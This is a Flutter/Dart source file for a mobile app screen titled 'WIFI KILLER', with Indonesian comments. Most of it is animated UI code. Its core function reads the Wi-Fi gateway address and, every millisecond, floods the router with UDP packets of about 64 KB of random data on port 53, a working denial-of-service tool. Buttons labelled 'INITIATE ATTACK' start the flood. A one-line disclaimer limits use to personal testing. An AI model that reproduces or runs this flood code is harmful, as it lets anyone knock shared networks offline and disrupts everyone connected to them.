import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> with TickerProviderStateMixin {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  late AnimationController _pulseController;
  late AnimationController _waveController;
  late AnimationController _scanController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _waveAnimation;
  late Animation<double> _scanAnimation;

  // Warna tema hitam biru
  final Color primaryDark = const Color(0xFF7F1D1D);
  final Color primaryBlue = const Color(0xFFB91C1C);
  final Color accentBlue = const Color(0xFFEF4444);
  final Color lightBlue = const Color(0xFFFCA5A5);
  final Color primaryWhite = Colors.white;
  final Color accentGrey = Colors.grey.shade400;
  final Color cardDark = const Color(0xFF7F1D1D);
  final Color glassColor = const Color(0x1FFFFFFF);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(seconds: 2),
      vsync: this,
    )..repeat(reverse: true);

    _waveController = AnimationController(
      duration: const Duration(seconds: 3),
      vsync: this,
    )..repeat();

    _scanController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );

    _pulseAnimation = Tween<double>(begin: 0.8, end: 1.2).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );

    _waveAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _waveController, curve: Curves.linear),
    );

    _scanAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _scanController, curve: Curves.easeOut),
    );

    _loadWifiInfo();
    _scanController.forward();
  }

  @override
  void dispose() {
    _stopFlood();
    _pulseController.dispose();
    _waveController.dispose();
    _scanController.dispose();
    super.dispose();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    // Request location permission
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });

      print("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    HapticFeedback.heavyImpact();
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    HapticFeedback.lightImpact();
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: cardDark,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: accentBlue.withOpacity(0.3)),
            boxShadow: [
              BoxShadow(
                color: accentBlue.withOpacity(0.3),
                blurRadius: 15,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text(
                title,
                style: TextStyle(
                  color: lightBlue,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                ),
              ),
              const SizedBox(height: 16),
              Text(
                message,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 16,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 20),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [primaryBlue, accentBlue],
                      begin: Alignment.centerLeft,
                      end: Alignment.centerRight,
                    ),
                    borderRadius: BorderRadius.circular(30),
                  ),
                  child: Text(
                    "OK",
                    style: TextStyle(
                      color: primaryWhite,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      body: Stack(
        children: [
          // Background dengan efek animasi
          _buildAnimatedBackground(),

          // Konten utama
          SafeArea(
            child: Column(
              children: [
                // Header dengan desain baru
                _buildNewHeader(),

                const SizedBox(height: 20),

                // Konten utama
                Expanded(
                  child: ssid == "-"
                      ? _buildLoadingView()
                      : _buildMainContent(),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAnimatedBackground() {
    return AnimatedBuilder(
      animation: _waveController,
      builder: (context, child) {
        return Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                primaryDark,
                const Color(0xFF151937),
                const Color(0xFF0F172A),
              ],
            ),
          ),
          child: Stack(
            children: [
              // Partikel animasi
              ...List.generate(20, (index) {
                final top = (_waveController.value + index * 0.05) % 1.0;
                final left = (index * 0.1) % 1.0;
                final size = 5.0 + (index % 4) * 3.0;
                final opacity = 0.1 + (index % 3) * 0.1;

                return Positioned(
                  top: top * MediaQuery.of(context).size.height,
                  left: left * MediaQuery.of(context).size.width,
                  child: Container(
                    width: size,
                    height: size,
                    decoration: BoxDecoration(
                      color: lightBlue.withOpacity(opacity),
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: lightBlue.withOpacity(opacity * 0.5),
                          blurRadius: size,
                          spreadRadius: size / 2,
                        ),
                      ],
                    ),
                  ),
                );
              }),

              // Efek cahaya
              Positioned(
                top: -150,
                right: -150,
                child: AnimatedBuilder(
                  animation: _waveController,
                  builder: (context, child) {
                    return Transform.rotate(
                      angle: _waveController.value * 2 * 3.14159,
                      child: Container(
                        width: 400,
                        height: 400,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              accentBlue.withOpacity(0.15),
                              Colors.transparent,
                            ],
                          ),
                        ),
                      ),
                    );
                  },
                ),
              ),

              // Gelombang animasi
              if (isKilling)
                Positioned(
                  bottom: 0,
                  left: 0,
                  right: 0,
                  child: AnimatedBuilder(
                    animation: _waveAnimation,
                    builder: (context, child) {
                      return CustomPaint(
                        size: Size(
                          MediaQuery.of(context).size.width,
                          200,
                        ),
                        painter: WavePainter(
                          _waveAnimation.value,
                          accentBlue.withOpacity(0.3),
                        ),
                      );
                    },
                  ),
                ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildNewHeader() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
      decoration: BoxDecoration(
        color: glassColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: Colors.white.withOpacity(0.2),
          width: 1,
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.2),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Row(
        children: [
          // Logo dengan animasi pulse
          AnimatedBuilder(
            animation: _pulseAnimation,
            builder: (context, child) {
              return Transform.scale(
                scale: isKilling ? _pulseAnimation.value : 1.0,
                child: Container(
                  width: 50,
                  height: 50,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [primaryBlue, accentBlue],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    borderRadius: BorderRadius.circular(15),
                    boxShadow: [
                      BoxShadow(
                        color: accentBlue.withOpacity(0.4),
                        blurRadius: 10,
                        offset: const Offset(0, 4),
                      ),
                    ],
                  ),
                  child: const Icon(
                    Icons.wifi_off,
                    color: Colors.white,
                    size: 30,
                  ),
                ),
              );
            },
          ),

          const SizedBox(width: 16),

          // Judul
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "WIFI KILLER",
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1.5,
                  ),
                ),
                Text(
                  "Internal Network Disruption",
                  style: TextStyle(
                    color: lightBlue,
                    fontSize: 14,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),

          // Status indikator
          Container(
            width: 12,
            height: 12,
            decoration: BoxDecoration(
              color: isKilling ? Colors.redAccent : lightBlue,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: (isKilling ? Colors.redAccent : lightBlue).withOpacity(0.5),
                  blurRadius: 5,
                  spreadRadius: 1,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLoadingView() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          // Loading animation
          AnimatedBuilder(
            animation: _scanAnimation,
            builder: (context, child) {
              return Stack(
                alignment: Alignment.center,
                children: [
                  // Outer circle
                  Container(
                    width: 120,
                    height: 120,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentBlue.withOpacity(0.3),
                        width: 2,
                      ),
                    ),
                  ),

                  // Middle circle
                  Container(
                    width: 100,
                    height: 100,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentBlue.withOpacity(0.5),
                        width: 2,
                      ),
                    ),
                  ),

                  // Inner circle
                  Container(
                    width: 80,
                    height: 80,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentBlue.withOpacity(0.7),
                        width: 2,
                      ),
                    ),
                  ),

                  // Scanning line
                  Transform.rotate(
                    angle: _scanAnimation.value * 2 * 3.14159,
                    child: Container(
                      width: 120,
                      height: 2,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [
                            Colors.transparent,
                            lightBlue,
                            Colors.transparent,
                          ],
                        ),
                      ),
                    ),
                  ),

                  // Center icon
                  Icon(
                    Icons.wifi,
                    color: lightBlue,
                    size: 40,
                  ),
                ],
              );
            },
          ),

          const SizedBox(height: 24),

          Text(
            "Scanning Network...",
            style: TextStyle(
              color: lightBlue,
              fontSize: 18,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
            ),
          ),

          const SizedBox(height: 8),

          Text(
            "Analyzing WiFi information",
            style: TextStyle(
              color: accentGrey,
              fontSize: 14,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMainContent() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Column(
        children: [
          // Network Information Section
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: glassColor,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: Colors.white.withOpacity(0.2),
                width: 1,
              ),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.2),
                  blurRadius: 10,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Icon(Icons.network_check, color: lightBlue),
                    const SizedBox(width: 8),
                    Text(
                      "NETWORK INFORMATION",
                      style: TextStyle(
                        color: primaryWhite,
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                      ),
                    ),
                  ],
                ),

                const SizedBox(height: 16),

                // SSID
                _buildInfoRow("SSID", ssid, Icons.wifi),

                const SizedBox(height: 12),

                // IP Address
                _buildInfoRow("IP Address", ip, Icons.important_devices),

                const SizedBox(height: 12),

                // Frequency
                _buildInfoRow("Frequency", "$frequency MHz", Icons.wifi),

                const SizedBox(height: 12),

                // Router IP
                _buildInfoRow("Router IP", routerIp, Icons.router),
              ],
            ),
          ),

          const SizedBox(height: 20),

          // Warning Box
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.3),
              borderRadius: BorderRadius.circular(15),
              border: Border.all(
                color: accentBlue.withOpacity(0.2),
                width: 1,
              ),
            ),
            child: Row(
              children: [
                Icon(Icons.warning_amber, color: lightBlue),
                const SizedBox(width: 12),
                Expanded(
                  child: Text(
                    "Feature ini mampu mematikan jaringan WiFi yang anda sambung. Gunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
                    style: TextStyle(
                      color: accentGrey,
                      fontSize: 14,
                    ),
                  ),
                ),
              ],
            ),
          ),

          const SizedBox(height: 30),

          // Attack Button
          GestureDetector(
            onTap: isKilling ? _stopFlood : _startFlood,
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 300),
              width: double.infinity,
              height: 60,
              decoration: BoxDecoration(
                gradient: isKilling
                    ? LinearGradient(
                  colors: [Colors.red.shade600, Colors.red.shade800],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                )
                    : LinearGradient(
                  colors: [primaryBlue, accentBlue],
                  begin: Alignment.centerLeft,
                  end: Alignment.centerRight,
                ),
                borderRadius: BorderRadius.circular(15),
                boxShadow: [
                  BoxShadow(
                    color: isKilling
                        ? Colors.red.withOpacity(0.4)
                        : accentBlue.withOpacity(0.4),
                    blurRadius: 10,
                    offset: const Offset(0, 4),
                  ),
                ],
              ),
              child: Center(
                child: isKilling
                    ? Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    SizedBox(
                      width: 20,
                      height: 20,
                      child: CircularProgressIndicator(
                        color: primaryWhite,
                        strokeWidth: 2,
                      ),
                    ),
                    const SizedBox(width: 12),
                    Text(
                      "STOP ATTACK",
                      style: TextStyle(
                        color: primaryWhite,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                        fontSize: 16,
                      ),
                    ),
                  ],
                )
                    : Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(Icons.flash_on, color: primaryWhite),
                    const SizedBox(width: 12),
                    Text(
                      "INITIATE ATTACK",
                      style: TextStyle(
                        color: primaryWhite,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                        fontSize: 16,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),

          const SizedBox(height: 20),

          // Status Indicator
          if (isKilling)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.red.withOpacity(0.2),
                borderRadius: BorderRadius.circular(15),
                border: Border.all(
                  color: Colors.red.withOpacity(0.5),
                  width: 1,
                ),
              ),
              child: Row(
                children: [
                  Container(
                    width: 12,
                    height: 12,
                    decoration: BoxDecoration(
                      color: Colors.redAccent,
                      shape: BoxShape.circle,
                    ),
                  ),
                  const SizedBox(width: 12),
                  Text(
                    "ATTACK IN PROGRESS",
                    style: TextStyle(
                      color: Colors.redAccent,
                      fontSize: 14,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildInfoRow(String label, String value, IconData icon) {
    return Row(
      children: [
        Container(
          width: 40,
          height: 40,
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.3),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(
              color: accentBlue.withOpacity(0.3),
              width: 1,
            ),
          ),
          child: Icon(
            icon,
            color: lightBlue,
            size: 20,
          ),
        ),

        const SizedBox(width: 12),

        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                label,
                style: TextStyle(
                  color: accentGrey,
                  fontSize: 12,
                ),
              ),
              Text(
                value,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }
}

// Custom painter untuk gelombang animasi
class WavePainter extends CustomPainter {
  final double animationValue;
  final Color color;

  WavePainter(this.animationValue, this.color);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..style = PaintingStyle.fill;

    final path = Path();
    final height = size.height;
    final width = size.width;

    path.moveTo(0, height);

    for (double i = 0; i <= width; i++) {
      final x = i;
      final y = height - 30 * sin((i / width * 2 * pi) + (animationValue * 2 * pi));
      path.lineTo(x, y);
    }

    path.lineTo(width, height);
    path.close();

    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => true;
}